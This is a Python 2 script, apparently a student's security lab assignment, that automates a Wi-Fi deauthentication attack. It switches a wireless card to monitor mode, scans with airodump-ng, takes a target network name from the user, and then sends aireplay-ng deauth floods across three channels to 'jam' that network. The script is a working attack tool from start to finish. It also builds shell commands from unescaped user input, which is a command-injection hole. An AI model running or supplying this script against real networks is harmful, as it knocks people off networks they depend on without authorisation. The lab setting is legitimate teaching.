import os
import sys
import csv
import time
import subprocess

print "="*50
print "\n\n Welcome to Project 2 Lab 3"
print "="*50
print " Yifan Chen | G44937967"
raw_input("\n Press Enter to continue..")

print "\n Please Determine your wireless interface from the list below."
time.sleep(0.5)

#Print all the available wireless interfaces
airmon = "ifconfig"
os.system(airmon)


#Stores the wireless interface in a String
interface = raw_input("\n Please Enter your wireless interface: ")


#Now Changing your NIC card into Monitor Mode
print "\n == Change your interface to Monitor Mode =="
ifconfig_down = "ifconfig " + interface + " down"
os.system(ifconfig_down)

iwconfig_monitor = "iwconfig " + interface + " mode monitor"
os.system(iwconfig_monitor)

ifconfig_up = "ifconfig " + interface + " up"
os.system(ifconfig_up)

print "\n Monitor Mode is ON! Wait..."
time.sleep(1)


#Scanning Signals for 20 sec.
print "\n == Step 1 Scanning Signals =="
raw_input("\n Press Enter to continue..")
wifi_scan = subprocess.Popen(["airodump-ng", interface])
time.sleep(20)
wifi_scan.terminate()


#Use ESSID to Target networks
print "\n == Step 2 Choose Target Network =="
raw_input("\n Press Enter to continue..")
get_essid = raw_input("Please Enter a ESSID to target with:")
airodump_essid = "airodump-ng -w ChannelResult --essid %s %s" %(get_essid,interface)

print "\n Press CTRL + C to Stop..."
os.system(airodump_essid)


#Gather Channel Number by using read the .csv file created 
BSSIDList = []
with open('ChannelResult-01.kismet.csv','rb') as Lab03:
	for line in Lab03.readlines():
		MacList = line.split(';')
		BSSIDCol = MacList[5]
		if len(BSSIDCol)<3:
			BSSIDList.append(BSSIDCol)
		
	print BSSIDList

#Choose All Target Channel Automatically
print "\n == Step 3 Jam ALL the Channels for 5 minutes =="

iwconfig_a = "iwconfig %s channel %s" %(interface, BSSIDList[0])
os.system(iwconfig_a)

aireplay_jam1 = "aireplay-ng --deauth 10 -e %s %s" %(get_essid , interface)
os.system(aireplay_jam1)

iwconfig_b = "iwconfig %s channel %s" %(interface, BSSIDList[1])
os.system(iwconfig_b)

aireplay_jam2 = "aireplay-ng --deauth 10 -e %s %s" %(get_essid , interface)
os.system(aireplay_jam2)

iwconfig_c = "iwconfig %s channel %s" %(interface, BSSIDList[2])
os.system(iwconfig_c)

aireplay_jam3 = "aireplay-ng --deauth 10 -e %s %s" %(get_essid , interface)
os.system(aireplay_jam3)


#Finish Line
def finish():
    print '\n\n', "Automated Program Finished! Good Bye!", '\n'
    raw_input('Press Enter to Quit! ')

finish()



